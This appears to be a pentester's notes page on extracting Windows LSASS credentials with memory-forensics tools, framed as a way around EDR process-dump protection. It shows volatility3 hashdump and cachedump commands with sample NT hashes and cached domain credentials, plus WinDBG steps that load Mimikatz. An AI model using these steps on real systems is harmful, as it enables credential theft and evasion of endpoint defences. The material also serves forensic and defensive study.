---
title: LSASS Dump with forensic tools
---

[[notes/windows/lsass-dump]] with memory forensic tools.

Try one of the following tools ([source](https://web.archive.org/web/20220919221915/https://medium.com/@balqurneh/bypass-crowdstrike-falcon-edr-protection-against-process-dump-like-lsass-exe-3c163e1b8a3e)):

- [FTK Imager](https://accessdata.com/product-download/ftk-imager-version-4-7-1), tested
- [Belkasoft Ram Capturer](https://belkasoft.com/ram-capturer)
- [Mandiant Memoryze](https://www.fireeye.de/services/freeware/memoryze.html)
- [WinPmem](https://github.com/Velocidex/WinPmem/)
- Magnet RAM Capture
- `dumpit.exe` (?)

Extract NT hashes of local users and domain-cached credentials of domain users from the raw memory image.

~~~
❯ podman run -it --rm --network host -v .:/workdir --entrypoint sh docker.io/sk4la/volatility3
$ volatility3 -f /workdir/memdump.mem windows.pslist.PsList | grep lsass
1056 1012 lsass.exe 0xce883eec7080 11 - 0 False 2022-09-19 13:12:51.000000 N/A Disabled
$ volatility3 -f /workdir/memdump.mem -o /tmp windows.hashdump.Hashdump  # sam / local users
User  rid  lmhash  nthash
Administrator        500  aad3b435b51404eeaad3b435b51404ee  6ed8e2f07dc16753aaaaaaaaaaaaaaaa
Gast                 501  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931aaaaaaaaaaaaaaaa
DefaultAccount       503  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931aaaaaaaaaaaaaaaa
WDAGUtilityAccount   504  aad3b435b51404eeaad3b435b51404ee  b313be82f9144a58aaaaaaaaaaaaaaaa
nobody              1002  aad3b435b51404eeaad3b435b51404ee  bd639192b56530c5aaaaaaaaaaaaaaaa
$ volatility3 -f /workdir/memdump.mem -o /tmp windows.cachedump.Cachedump  # lsa / domain cached credentials
Username  Domain  Domain name  Hash
johndoe   CORP    CORP.COM     dd 9b d2 5d c9 58 87 63 aa aa aa aa aa aa aa aa
janedoe   CORP    CORP.COM     8f 76 2c cc f1 a9 82 7d aa aa aa aa aa aa aa aa
~~~

There seems to be no tool that can extract NT hashes of domain users from raw memory images.
`pypykatz` and `rekall` didn't work.

~~~
❯ podman run -it --rm --network host -v .:/workdir docker.io/remnux/rekall
$ pypykatz lsa rekall -o /tmp/creds.txt /workdir/memdump.mem
...
~~~

Extract LSASS from kernel dump with WinDBG and Mimikatz.

~~~
.load C:\Users\Nobody\Malware\mimilib.dll
.symfix
.reload
!process 0 0 lsass.exe
.process /r /p ffffdb8ed0936080
!mimikatz
~~~

Untested tools:

- [Physmem2profit](https://github.com/fsecurelabs/physmem2profit), dump LSASS by analyzing physical memory remotely
